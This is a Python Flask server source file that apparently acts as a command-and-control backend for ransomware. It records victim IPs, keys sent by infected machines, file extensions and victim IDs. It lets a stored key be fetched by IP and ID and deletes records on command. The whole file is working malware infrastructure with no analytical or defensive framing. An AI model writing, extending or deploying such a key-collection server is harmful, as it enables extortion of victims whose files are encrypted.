from flask import Flask,request
import string,random

app = Flask(__name__)

def generate_id(length, start=1, num_id=5):
    id = []
    for i in range(start, start + num_id):
        id2 = ''.join(random.choice(random.choice((string.ascii_letters + string.digits + string.punctuation,string.ascii_letters + string.digits,string.ascii_letters))) for _ in range(length))
        if id2 not in id:
         id.append(id2)
        else:
         length += 1
    return id

@app.route('/ID_QUERY')
def make_id():
 id_range = 2
 while True:
  c = 0
  ips_target = request.headers.get('X-Client-Ip')
  unique_id = generate_id(id_range, start=1, num_id=5)
  got = ''
  for id in unique_id:
   got += id
   got += '-'
  got += str(ips_target)
  with open('id.txt','r') as f:
   for a in f.readlines():
    a = a.replace('\n','')
    if a == got:
     c = 1
  if c == 1:
   id_range += 1
  else:
     with open('id.txt','a') as f:
      f.write(f'{got}\n')
      return got

@app.route('/Downloads')
def header_download():
 ips_target = request.headers.get('X-Client-Ip')
 got_id = request.headers.get('Id-Got')
 lines = ''
 with open('cache.txt','r') as f:
  for a in f.readlines():
    a2 = a.replace('\n','')
    if a2.split(' ')[0].replace('TARGET=','') == ips_target and a2.split(' ')[3].replace('ID=','') == got_id:
     lines = a2
 return lines

@app.route('/')
def header_recv():
 mode = request.headers.get('Mode')
 key = request.headers.get('X-Keys')
 ips_target = request.headers.get('X-Client-Ip')
 got_id = request.headers.get('Id-Got')
 file_got = request.headers.get('FILES')
 if request.method == 'GET':
  if mode == 'DEL':
   lines = []
   with open('cache.txt','r') as f2:
    for a in f2.readlines():
     a2 = a.replace('\n','')
     if a2.split(' ')[0].replace('TARGET=','') == ips_target and a2.split(' ')[3].replace('ID=','') == got_id:
      print(f"{a2} MATCH . . .")
     else:
      lines.append(a)

    with open('cache.txt','w') as f2:
     f2.write('')
    with open('cache.txt','a') as f2:
     for lines2 in lines:
      f2.write(lines2)

    lines3 = []
    with open('id.txt','r') as f:
     for a in f.readlines():
      a2 = a.replace('\n','')
      if a2 == got_id:
       print(f"{a2} MATCH . . .")
      else:
       lines3.append(a)

    with open('id.txt','w') as f:
     f.write('')
    with open('id.txt','a') as f:
     for lines2 in lines3:
      f.write(lines2)
  else:
   if key != None and ips_target != None:
    with open('cache.txt','a') as f:
     f.write(f'TARGET={ips_target} GOT="{key}" EX={file_got} ID={got_id}\n')
 return 'HELLO, WORLD'

app.run('0.0.0.0',5000)